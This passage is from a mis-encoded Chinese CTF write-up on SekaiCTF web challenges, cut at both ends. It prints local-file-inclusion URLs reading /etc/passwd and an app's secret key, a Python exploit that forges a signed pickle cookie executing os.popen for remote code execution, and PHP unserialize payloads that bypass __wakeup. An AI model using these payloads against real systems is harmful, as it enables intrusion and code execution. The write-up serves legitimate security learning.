class="regexp">/self/</span>cwd/app.py</span><br><span class="line"></span><br><span class="line">æ‰€ä»¥ä¸éœ€è¦è›®åŠ› proc<span class="regexp">/self/</span> åªéœ€ä½¿ç”¨å®ƒæ¥è·å–æºä»£ç </span><br><span class="line"></span><br><span class="line">ä½¿ç”¨è¿™ç§æ–¹å¼ä½ å¯ä»¥é˜…è¯»ç§˜å¯†--sekai</span><br><span class="line"></span><br><span class="line">http:<span class="regexp">//</span>bottle-poem.ctf.sekai.team<span class="regexp">/show?id=/</span>proc<span class="regexp">/self/</span>cwd<span class="regexp">/config/</span>secret.py</span><br><span class="line"></span><br><span class="line">ç°åœ¨æ‚¨å¯ä»¥æ§åˆ¶ cookieï¼Œä½†å¦‚æœæ‚¨é˜…è¯» <span class="regexp">/views/</span>admin.html ä¹‹ç±»çš„å†…å®¹ï¼Œæˆ–è€…åªæ˜¯è®©è®¿å®¢æˆä¸ºç®¡ç†å‘˜ï¼Œæ‚¨ä¼šå‘ç°å®ƒæ˜¯ä¸€ä¸ªå·¨é­”ï¼ˆå¯ä»¥ç†è§£ä¸ºæ¶æï¼‰</span><br><span class="line"></span><br><span class="line">æ‰€ä»¥ä½ çœŸçš„éœ€è¦ rce å¦‚æœä½ æœç´¢ä¸€äº›æ–‡æ¡£ä¼šå‘ç°ç“¶å­çš„ cookie_decode() ä¼šè§£å¼€æ‰€ä»¥ç”¨å®ƒæ¥è·å– rce</span><br><span class="line">https:<span class="regexp">//gi</span>thub.com<span class="regexp">/bottlepy/</span>bottle<span class="regexp">/issues/</span><span class="number">900</span></span><br><span class="line"></span><br><span class="line">è¿™é‡Œçš„æ­¥éª¤</span><br><span class="line"><span class="number">1</span>.lfiè¯»å–æ–‡ä»¶å’Œç§˜å¯†</span><br><span class="line"><span class="number">2</span>.ä½¿ç”¨cookie pickle rce åå¼¹ä¸€ä¸ªshell</span><br><span class="line"><span class="number">3</span>.æ‰§è¡Œ/flagè·å–flag</span><br></pre></td></tr></table></figure><p>å®˜æ–¹<code>exp</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">demo exp</span><br><span class="line"><span class="keyword">import</span> base64,hashlib,pickle,hmac</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tob</span>(<span class="params">s, enc=<span class="string">&#x27;utf8&#x27;</span></span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(s, <span class="built_in">str</span>):</span><br><span class="line">        <span class="keyword">return</span> s.encode(enc)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;&#x27;</span> <span class="keyword">if</span> s <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">else</span> <span class="built_in">bytes</span>(s)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cookie_encode</span>(<span class="params">data, key</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27; Encode and sign a pickle-able object. Return a (byte) string &#x27;&#x27;&#x27;</span></span><br><span class="line">    msg = base64.b64encode(pickle.dumps(data, <span class="number">0</span>))</span><br><span class="line">    sig = base64.b64encode(hmac.new(tob(key), msg, digestmod=hashlib.md5).digest())</span><br><span class="line">    <span class="keyword">return</span> tob(<span class="string">&#x27;!&#x27;</span>) + sig + tob(<span class="string">&#x27;?&#x27;</span>) + msg</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">test</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">eval</span>,(<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;command&quot;)&#x27;</span>,))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">obj = test()</span><br><span class="line">a = cookie_encode(obj,<span class="string">&#x27;Se3333KKKKKKAAAAIIIIILLLLovVVVVV3333YYYYoooouuu&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br></pre></td></tr></table></figure><hr><p>ä¸‹é¢æ˜¯æˆ‘å¤ç°ç†è§£æ“ä½œ</p><p>å…ˆæ‰“å¼€ç½‘ç«™ï¼Œçœ‹åˆ°æœ‰ä¸‰ä¸ªå¯ä»¥æ‰“å¼€çš„é“¾æ¥</p><p><img src="/2023/02/13/SekaiCTF-wp/image-20221003201506807.png" alt="image-20221003201506807"></p><p>å…ˆçœ‹çœ‹æºç </p><p><img src="/2023/02/13/SekaiCTF-wp/image-20221003201547093.png" alt="image-20221003201547093"></p><p>å‘ç°æ²¡ä»€ä¹ˆé¢å¤–çš„ä¿¡æ¯ï¼Œä¸‰ä¸ªé“¾æ¥æ˜¯å¯¹åº”ç€ä¸‰ä¸ªæ–‡æœ¬æ–‡ä»¶</p><p>çœ‹èµ·æ¥ä¼¼ä¹æ˜¯æ–‡ä»¶åŒ…å«çš„é¢˜</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>bottle-poem.ctf.sekai.team/show?id=spring.txt</span><br></pre></td></tr></table></figure><p><img src="/2023/02/13/SekaiCTF-wp/image-20221003202543907.png" alt="image-20221003202543907"></p><p>æˆ‘ä»¬è¯•è¯•èƒ½ä¸èƒ½æ˜¾ç¤ºå…¶ä»–ä¿¡æ¯ï¼Œæˆ‘åœ¨åšçš„æ—¶å€™è¯•çš„æ˜¯<code>/etc/passwd</code></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>bottle-poem.ctf.sekai.team<span class="regexp">/show?id=/</span>etc/passwd</span><br></pre></td></tr></table></figure><p><img src="/2023/02/13/SekaiCTF-wp/image-20221003202814644.png" alt="image-20221003202814644"></p><p>çœ‹æ¥æ˜¯æ–¹å‘å¯¹äº†ï¼Œç¡®å®æ˜¯å¯ä»¥åŒ…å«æœ¬åœ°æ–‡ä»¶å¹¶æ˜¾ç¤ºï¼Œä½†æ˜¯æ²¡æœ‰å…¶ä»–ä¿¡æ¯èƒ½åˆ©ç”¨</p><h3 id="æŸ¥çœ‹å½“å‰è¿›ç¨‹çš„å¯åŠ¨å‘½ä»¤"><a href="#æŸ¥çœ‹å½“å‰è¿›ç¨‹çš„å¯åŠ¨å‘½ä»¤" class="headerlink" title="*æŸ¥çœ‹å½“å‰è¿›ç¨‹çš„å¯åŠ¨å‘½ä»¤"></a>*æŸ¥çœ‹å½“å‰è¿›ç¨‹çš„å¯åŠ¨å‘½ä»¤</h3><p>è¿™ä¸ªæ˜¯çœ‹æœ€åå‘çš„<code>wp</code>ï¼Œå­¦åˆ°äº†</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/proc/</span>self/cmdline</span><br><span class="line"></span><br><span class="line"><span class="regexp">//</span>è¯¥æ–‡ä»¶åŒ…å«çš„æ˜¯è¯¥è¿›ç¨‹çš„å‘½ä»¤è¡Œå‚æ•°ï¼ŒåŒ…æ‹¬è¿›ç¨‹çš„å¯åŠ¨è·¯å¾„(argv[<span class="number">0</span>])</span><br></pre></td></tr></table></figure><p>ç„¶åä¼šä¸‹è½½ä¸€ä¸ªåå«<code>show</code>çš„æ–‡ä»¶</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -u <span class="regexp">/app/</span>app.py </span><br></pre></td></tr></table></figure><p>åœ¨å‘½ä»¤ä¸­ï¼Œæˆ‘ä»¬å‘ç°è¿è¡Œäº†ä¸€ä¸ª<code>/app/app.py</code>çš„æ–‡ä»¶</p><p>çœ‹æ¥è¿™å°±æ˜¯æˆ‘ä»¬ç½‘ç«™å¯åŠ¨çš„è„šæœ¬ï¼Œé‡Œé¢å°±æœ‰æˆ‘ä»¬ç½‘ç«™çš„æºç </p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>bottle-poem.ctf.sekai.team<span class="regexp">/show?id=/</span>app/app.py</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹åˆ°æ–‡ä»¶æºç </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> bottle <span class="keyword">import</span> route, run, template, request, response, error</span><br><span class="line"><span class="keyword">from</span> config.secret <span class="keyword">import</span> sekai</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">home</span>():</span><br><span class="line">    <span class="keyword">return</span> template(<span class="string">&quot;index&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@route(<span class="params"><span class="string">&quot;/show&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    response.content_type = <span class="string">&quot;text/plain; charset=UTF-8&quot;</span></span><br><span class="line">    param = request.query.<span class="built_in">id</span></span><br><span class="line">    <span class="keyword">if</span> re.search(<span class="string">&quot;^../app&quot;</span>, param):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No!!!!&quot;</span></span><br><span class="line">    requested_path = os.path.join(os.getcwd() + <span class="string">&quot;/poems&quot;</span>, param)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(requested_path) <span class="keyword">as</span> f:</span><br><span class="line">            tfile = f.read()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No This Poems&quot;</span></span><br><span class="line">    <span class="keyword">return</span> tfile</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@error(<span class="params"><span class="number">404</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">error404</span>(<span class="params">error</span>):</span><br><span class="line">    <span class="keyword">return</span> template(<span class="string">&quot;error&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@route(<span class="params"><span class="string">&quot;/sign&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        session = request.get_cookie(<span class="string">&quot;name&quot;</span>, secret=sekai)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> session <span class="keyword">or</span> session[<span class="string">&quot;name&quot;</span>] == <span class="string">&quot;guest&quot;</span>:</span><br><span class="line">            session = &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;guest&quot;</span>&#125;</span><br><span class="line">            response.set_cookie(<span class="string">&quot;name&quot;</span>, session, secret=sekai)</span><br><span class="line">            <span class="keyword">return</span> template(<span class="string">&quot;guest&quot;</span>, name=session[<span class="string">&quot;name&quot;</span>])</span><br><span class="line">        <span class="keyword">if</span> session[<span class="string">&quot;name&quot;</span>] == <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> template(<span class="string">&quot;admin&quot;</span>, name=session[<span class="string">&quot;name&quot;</span>])</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;pls no hax&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    os.chdir(os.path.dirname(__file__))</span><br><span class="line">    run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">8080</span>)</span><br></pre></td></tr></table></figure><p>åœ¨</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> config.secret <span class="keyword">import</span> sekai</span><br></pre></td></tr></table></figure><p>çœ‹åˆ°<code>config.secret</code>ï¼Œè¿™æ˜¯ä¸ªæ–‡ä»¶è·¯å¾„<code>/config/secret</code></p><p>æˆ‘ä»¬å¯ä»¥è®¿é—®çœ‹çœ‹ï¼Œèƒ½ä¸èƒ½çœ‹åˆ°é‡Œé¢çš„å†…å®¹ã€æ³¨æ„è¿™ä¸ªæ–‡ä»¶è‚¯å®šæ˜¯åœ¨ <code>/app</code>ç›®å½•ä¸‹ã€‘</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>bottle-poem.ctf.sekai.team<span class="regexp">/show?id=/</span>app<span class="regexp">/config/</span>secret.py</span><br></pre></td></tr></table></figure><p>å¾—åˆ°</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">sekai</span> <span class="operator">=</span> <span class="string">&quot;Se3333KKKKKKAAAAIIIIILLLLovVVVVV3333YYYYoooouuu&quot;</span></span><br></pre></td></tr></table></figure><hr><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">1.</span> lfi è¯»å–æ–‡ä»¶å’Œç§˜å¯†</span><br><span class="line"><span class="bullet">2.</span> ä½¿ç”¨ cookie pickle rce åå¼¹shell</span><br><span class="line"><span class="bullet">3.</span> æ‰§è¡Œ./flagè·å–flag</span><br></pre></td></tr></table></figure><p>æ ¹æ®å®˜æ–¹çš„<code>pickle rce</code>ï¼Œè¿™ä¸ªæ¶‰åŠæ–°çš„ <code>pickle</code> ååºåˆ—åŒ–æŠ€å·§</p><p>ã€æµä¸‹æ²¡æŠ€æœ¯çš„çœ¼æ³ªã€‘å¯æˆ‘ç°åœ¨åªä¼š<code>php</code>ååºåˆ—åŒ–ï¼Œåé¢è¡¥ä¸Š</p><hr><h2 id="2-sekai-game-start"><a href="#2-sekai-game-start" class="headerlink" title="2.sekai-game-start"></a>2.sekai-game-start</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;./flag.php&#x27;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sekai_Game</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$start</span> = True;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;start === True)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Sekai Game Start Here is your flag &quot;</span>.<span class="title function_ invoke__">getenv</span>(<span class="string">&#x27;FLAG&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;start=False;    </span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;sekai_game.run&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;sekai_game.run&#x27;</span>]);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>çœ‹èµ·æ¥æ˜¯åˆ°<code>ååºåˆ—åŒ–</code>çš„é¢˜ç›®ï¼Œçœ‹èµ·æ¥ä¼¼ä¹éš¾åº¦ä¸å¤§ï¼Œä½†æ˜¯æˆ‘è¢«ç“¶å­è¯—å¡äº†å¤ªä¹…ï¼Œè¿™å‡ å¤©åˆåœ¨æ<code>DC5</code>ï¼Œåé¢çš„é¢˜ç›®å‘å¸ƒå‡ºæ¥éƒ½æ²¡æ€ä¹ˆçœ‹äº†ï¼Œæ—©çŸ¥é“åšä¸€ä¸‹äº†<code>ã€å“­å”§å”§ã€‘</code></p><p>æˆ‘ä»¬å…ˆç®€å•çš„åˆ†æä¸€ä¸‹æºç å†…å®¹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;./flag.php&#x27;</span>);    <span class="comment">//æ–‡ä»¶åŒ…å«ï¼ŒæŠŠå½“å‰ç›®å½•flag.phpæ–‡ä»¶</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sekai_Game</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$start</span> = True;<span class="comment">//ç»™stratå˜é‡èµ‹å€¼ä¸ºTrue</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;start === True)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Sekai Game Start Here is your flag &quot;</span>.<span class="title function_ invoke__">getenv</span>(<span class="string">&#x27;FLAG&#x27;</span>);</span><br><span class="line">            <span class="comment">//getenvå‡½æ•° ç”¨æ¥è·å–php ç¯å¢ƒå˜é‡</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;start=False;</span><br><span class="line"><span class="comment">//è¿™é‡ŒåˆæŠŠstartå˜é‡èµ‹å€¼ä¸ºFalseï¼Œæ‰€ä»¥è¿™é‡Œæ˜¯éœ€è¦ç»•è¿‡__wakeupé­”æœ¯æ–¹æ³•ï¼Œä¸è®©å…¶æ‰§è¡Œï¼Œåªç”¨æŠŠå±æ€§ä¸ªæ•°æ”¹å¾—å¤§äºåŸæ¥å°±è¡Œ</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;sekai_game.run&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;sekai_game.run&#x27;</span>]);  <span class="comment">//è¿™é‡Œå°±æ˜¯åºåˆ—åŒ–çš„å˜é‡ï¼Œå˜é‡åä¸ºsekai_game.run</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç„¶åæˆ‘ä»¬æ•´ç†ä¸€ä¸‹</p><p>å¾—åˆ°æˆ‘ä»¬çš„åºåˆ—åŒ–çš„<code>php</code>ä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sekai_Game</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$start</span> = True;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Sekai_Game</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¿è¡Œå¾—åˆ°åºåˆ—åŒ–ç»“æœ</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">O</span>:<span class="number">10</span>:<span class="string">&quot;Sekai_Game&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;start&quot;</span>;b:<span class="number">1</span>;&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬ä¿®æ”¹ä¸€ä¸‹å±æ€§å€¼</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">O</span>:<span class="number">10</span>:<span class="string">&quot;Sekai_Game&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;start&quot;</span>;b:<span class="number">1</span>;&#125;</span><br></pre></td></tr></table></figure><p><code>ã€è‹¦ç¬‘ã€‘ä½†å®é™…æ˜¯ä¸è¡Œçš„</code></p><h3 id="å…³é”®è€ƒç‚¹"><a href="#å…³é”®è€ƒç‚¹" class="headerlink" title="å…³é”®è€ƒç‚¹"></a>å…³é”®è€ƒç‚¹</h3><p>ä½†æ˜¯</p><p><img src="/2023/02/13/SekaiCTF-wp/image-20221003135130855.png" alt="image-20221003135130855"></p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PhP å˜é‡ä¸èƒ½ä½¿ç”¨ . ï¼Œä½†æ˜¯è¿™ä¸ªå˜é‡åå¾ˆç‰¹æ®Šï¼šsekai_game.run. å®ƒåŒæ—¶å…·æœ‰ <span class="literal">_</span> å’Œ . </span><br><span class="line"></span><br><span class="line">phpé»˜è®¤å°†.æ‰€æœ‰å‚æ•°åç§°è½¬æ¢ä¸º<span class="literal">_</span>ï¼Œå› ä¸ºç‰ˆæœ¬æ—©äº<span class="number">8</span>ï¼Œæœ‰ä¸€ç§æ–¹æ³•å¯ä»¥è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œä½¿ç”¨[ ï¼Œphpå¿½ç•¥æ‰€æœ‰ . ï¼Œåªè½¬æ¢[ä¸º<span class="literal">_</span>å‚æ•° ==&gt; ?sekai[game.run=</span><br><span class="line"></span><br><span class="line">**å­¦åˆ°äº†**</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥æœ‰æ•ˆçš„<code>payload</code>ä¸º</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url/?sekai[game.<span class="attribute">run</span>=xxx</span><br></pre></td></tr></table></figure><p>ç¬¬äºŒæ­¥æ˜¯ç»•è¿‡<code>__wakeup</code></p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">è¿™é‡Œæˆ‘ç”¨</span><br><span class="line">O:10:&quot;Sekai_Game&quot;:2:&#123;s:5:&quot;start&quot;;b:1;&#125;</span><br><span class="line"></span><br><span class="line">å®é™…è¿˜æ˜¯ç»•ä¸è¿‡__wakeupå‡½æ•°ï¼Œå°±ç®—æ˜¯å±æ€§ä¸ªæ•°å¤§äºåŸæ¥çš„å±æ€§ä¸ªæ•°</span><br><span class="line"></span><br><span class="line"><span class="section">==&gt;ç½‘ä¸Šæ‰¾äº†ä»¥åï¼Œå‘ç°è¿™ä¸ªæ–¹æ³•æ˜¯æœ‰å±€é™æ€§çš„ï¼Œå¯¹äºé«˜ç‰ˆæœ¬çš„phpï¼Œè¿™æ ·æ˜¯æ— æ³•ç»•è¿‡__wakeup()</span></span><br><span class="line"><span class="section">----</span></span><br><span class="line"></span><br><span class="line">å¯¹äºé«˜ç‰ˆæœ¬çš„php</span><br><span class="line">å¯ä»¥ç”¨C:æ¥ç»•è¿‡</span><br><span class="line"></span><br><span class="line">åŸç†æ˜¯C:ä»£è¡¨è¿™ä¸ªç±»å®ç°äº†serializeableæ¥å£ï¼Œè€Œserializeableä¸æ”¯æŒ<span class="emphasis">__wakeupï¼Œå°±ç»•è¿‡å»äº†</span></span><br><span class="line"><span class="emphasis">==&gt;</span></span><br><span class="line"><span class="emphasis">C:10:&quot;Sekai_</span>Game&quot;:2:&#123;s:5:&quot;start&quot;;b:1;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ä½†æ˜¯å› ä¸ºæºç ä¸­å·²ç»èµ‹å€¼ï¼Œæ‰€ä»¥ä¸å¡«å†™æ•°æ®ï¼Œ</span><br><span class="line">åªç”¨å®ä¾‹åŒ–Sekai_Gameç±»</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sekai_Game</span></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Sekai_Game</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">==&gt;O:<span class="number">10</span>:<span class="string">&quot;Sekai_Game&quot;</span>:<span class="number">0</span>:&#123;&#125;</span><br><span class="line">==&gt;C:<span class="number">10</span>:<span class="string">&quot;Sekai_Game&quot;</span>:<span class="number">0</span>:&#123;&#125;</span><br></pre></td></tr></table></figure><p>äºæ˜¯æœ€åçš„payloadä¸º</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sekai[game.<span class="built_in">run</span>=C:<span class="number">10</span>:<span class="string">&quot;Sekai_Game&quot;</span>:<span class="number">0</span>:&#123;&#125;</span><br></pre></td></tr></table></figure><p><img 